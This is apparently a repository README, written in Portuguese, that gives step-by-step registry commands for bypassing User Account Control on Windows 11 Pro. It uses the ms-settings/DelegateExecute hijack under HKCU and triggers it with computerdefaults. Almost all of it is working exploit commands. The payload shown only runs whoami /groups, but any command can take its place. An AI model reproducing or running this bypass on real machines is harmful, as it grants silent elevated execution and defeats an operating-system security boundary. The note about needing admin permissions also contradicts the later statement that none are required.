# Bypass UAC Windows 11 Pro

Este repositório fornece um método para contornar o Controle de Conta de Usuário (UAC) no Windows 11 Pro utilizando modificações no Registro do Windows.

## Instruções para Adicionar as Entradas de Registro

Antes de executar os comandos abaixo, certifique-se de ter permissões administrativas, pois as alterações no Registro podem afetar o sistema operacional.

1. **Adicionar a Chave de Registro**

   Primeiro, adicione a chave principal para configurar o comando que será executado:
   ```
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\Command
   ```

2. **Adicionar o Valor `DelegateExecute`**

   Em seguida, adicione o valor `DelegateExecute` como uma string de registro:
   ```
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\Command /v DelegateExecute /t REG_SZ
   ```

3. **Definir o Comando a Ser Executado**

   Finalmente, defina o comando a ser executado quando a chave for chamada. O comando executará `cmd.exe` para listar os grupos do usuário e filtrar o resultado para encontrar "Rótulo Obrigatório":
   ```
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\Command /d "cmd.exe /k \"whoami /groups ^| findstr \"Rótulo Obrigatório\"\"" /f
   ```

   - **`cmd.exe /k`**: Mantém a janela do Prompt de Comando aberta após a execução do comando.
   - **`whoami /groups`**: Lista todos os grupos de que o usuário é membro.
   - **`^|`**: Escapa o caractere pipe para que seja passado corretamente para o `findstr`.
   - **`findstr \"Rótulo Obrigatório\"`**: Filtra a saída para encontrar linhas que contêm "Rótulo Obrigatório".

## Prova de Conceito (PoC)

Para verificar se a configuração foi aplicada corretamente, você pode executar os seguintes comandos:

1. **Abrir Configurações do Computador**

   Execute o comando `computerdefaults` para iniciar a aplicação com as configurações alteradas.

2. **Verificar Grupos do Usuário**

   Utilize o comando a seguir para listar os grupos do usuário atual e verificar a presença do "Rótulo Obrigatório":
   ```
   whoami /groups
   ```

## Notas Adicionais

- **Permissões**: Alterar esse Registro HKCU não requer permissões administrativas.
- **Segurança**: Modificar o Registro pode afetar o comportamento do sistema. Use esses comandos com cautela e certifique-se de compreender suas implicações.
